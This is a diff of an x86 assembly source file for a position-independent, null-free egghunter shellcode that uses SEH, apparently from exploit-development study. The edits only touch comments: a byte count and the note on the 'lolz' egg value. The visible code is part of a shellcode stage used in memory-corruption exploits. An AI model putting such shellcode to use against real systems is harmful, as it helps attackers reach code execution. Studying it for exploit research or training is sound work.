@@ -1,4 +1,4 @@
-; position independent non-NULL egghunter shellcode using SEH
+; position independent non-NULL egghunter shellcode using SEH - 60 bytes
 ;
 ; NOTE example to generate new egg value as 'lolz': 
 ;      python3 -c "print('0x'+'lolz'.encode()[::-1].hex())"  
@@ -18,7 +18,8 @@ global _start
 ;   ...
 
 _start:
-  mov   eax, 0x7a6c6f6c      ; set the egg (currently 'lolz')
+  ; NOTE: egg currently set to 'lolz'
+  mov   eax, 0x7a6c6f6c      ; set the egg 
   jmp   get_handler_address  ; jump to get SEH handler address dynamically (PIC)
 install_handler:
   pop   ecx                  ; pull the address of the SEH handler off the stack 
